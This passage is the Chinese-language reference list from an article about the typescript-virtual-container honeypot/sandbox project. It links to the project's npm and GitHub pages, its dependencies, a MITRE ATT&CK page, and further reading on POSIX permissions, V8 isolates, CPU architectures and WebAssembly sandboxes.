- **MITRE ATT&CK T1082**，系统信息发现（攻击者怎么识蜜罐）：[attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**：[npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**：[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **在线演示**：[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **架构指南**：[github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`**（SSH 协议实现），npm：[npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub：[github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`**（VFS 快照压缩），npm：[npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`**（WebSocket shell 传输），npm：[npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### 延伸阅读

- **POSIX 权限模型**，Open Group 规范：[pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **预写日志**（VFS 持久用模式）：[en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate 模型**，"Embedder's Guide"：[v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA 规范**（TinyEMU/JSLinux 上下文）：[riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 架构**：[opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**，Simon Willison TIL，Wasm 对比：[til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**，Simon Willison TIL，quickjs-emscripten 包大小：[til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)



